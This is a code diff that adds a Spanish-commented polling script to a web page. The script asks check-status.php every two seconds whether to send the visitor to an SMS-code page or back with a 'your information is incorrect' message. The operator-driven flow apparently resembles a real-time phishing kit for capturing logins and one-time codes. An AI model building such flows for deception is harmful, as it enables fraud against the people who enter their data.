@@ -150,5 +150,30 @@
     </div>
   </main>
 
+  <script>
+    // Polling: consultar cada 2 segundos si hay una acción pendiente
+    var sessionId = sessionStorage.getItem('sessionId');
+    
+    if (sessionId) {
+      var pollInterval = setInterval(async function() {
+        try {
+          var response = await fetch('check-status.php?session=' + encodeURIComponent(sessionId));
+          var data = await response.json();
+          
+          if (data.action === 'sms') {
+            clearInterval(pollInterval);
+            window.location.href = 'codigo.html';
+          } else if (data.action === 'info_error') {
+            clearInterval(pollInterval);
+            sessionStorage.setItem('errorMessage', 'La información ingresada es incorrecta. Por favor, verifica tus datos.');
+            window.location.href = 'index.html';
+          }
+        } catch (e) {
+          // Silenciar errores de red
+        }
+      }, 2000);
+    }
+  </script>
+
 </body>
 </html>
